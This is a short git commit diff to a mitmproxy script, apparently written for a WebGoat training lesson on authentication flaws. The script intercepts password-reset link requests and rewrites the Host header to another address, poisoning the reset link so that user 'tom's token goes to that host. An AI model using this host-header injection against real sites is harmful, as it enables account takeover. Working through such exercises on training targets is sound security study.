1aa4bfc4ad802321bd3afe26904e6e2e07babdfe
Piotr Szyma <thompson2908@gmail.com>
2019-05-22 21:02:59 +0200

    tom pass change by link works

--- mitmproxy/03_authentication_flaws/password_reset_tom_mail.py
+++ mitmproxy/03_authentication_flaws/password_reset_tom_mail.py
@@ -7,6 +7,6 @@ import requests
 def request(flow: http.HTTPFlow) -> None:
   if 'PasswordReset/reset/create-password-reset-link' in flow.request.url:
     flow.request.url = 'http://localhost:8000/WebGoat/PasswordReset/reset/create-password-reset-link'
-    flow.request.headers['Host'] = 'localhost:9090'
+    flow.request.headers['Host'] = '172.20.0.1:9090'
     print(flow.request.headers)
     print(flow.request.content)
